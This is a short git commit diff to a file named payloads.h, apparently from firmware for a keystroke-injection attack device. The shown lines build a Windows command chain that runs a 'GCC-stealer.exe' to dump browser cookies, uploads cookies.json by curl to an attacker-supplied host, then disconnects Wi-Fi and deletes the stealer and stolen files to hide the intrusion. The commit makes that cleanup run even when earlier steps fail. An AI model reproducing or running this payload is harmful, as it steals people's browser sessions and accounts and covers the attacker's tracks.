cec60bbdbc655937a9afa667683543aca53acd13
Alessandro Ideo <ideo.alessandro@protonmail.com>
2024-03-03 11:28:06 +0100

    Ignore errors to disconnect del files and exit

--- payloads.h
+++ payloads.h
@@ -185,8 +185,8 @@ void run_payload_setup(){
   " && .\\GCC-stealer.exe --json-file" \
   " && timeout /t 5" \
   " && curl -X POST -F data=@cookies.json http://"+str+"/upload" \
-  " && netsh wlan disconnect" \
-  " && del cookies.json GCC-stealer.exe Wi-Fi-AP-0.xml & exit";
+  " & netsh wlan disconnect" \
+  " & del cookies.json GCC-stealer.exe Wi-Fi-AP-0.xml & exit";
 
   DISP.setTextColor(BGCOLOR, FGCOLOR);
   DISP.println("Runing payload...");
